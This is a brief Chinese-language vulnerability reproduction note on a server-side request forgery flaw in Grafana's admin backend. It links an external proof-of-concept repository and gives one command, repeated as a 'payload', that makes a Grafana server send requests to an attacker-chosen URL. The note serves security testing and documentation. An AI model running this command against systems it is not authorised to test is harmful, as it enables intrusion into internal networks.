# Grafana管理后台SSRF

## 漏洞描述
Grafana是一个开源的度量分析与可视化套件。在其管理后台中存在一个功能，攻击者可以用于向任意地址发送HTTP请求，且支持自定义HTTP Header。

参考链接：

- https://github.com/RandomRobbieBF/grafana-ssrf

## 危害等级
CRITICAL

## 参考链接
- https://github.com/RandomRobbieBF/grafana-ssrf

## 漏洞复现方法
使用[这个POC](https://github.com/RandomRobbieBF/grafana-ssrf)来复现SSRF漏洞：

```
python grafana-ssrf.py -H http://your-ip:3000 -u http://example.com/attack
```

![image-20220705162041577](images/202207051620666.png)

可见，反连平台已成功收到了HTTP请求：


## Payloads
```
python grafana-ssrf.py -H http://your-ip:3000 -u http://example.com/attack
```
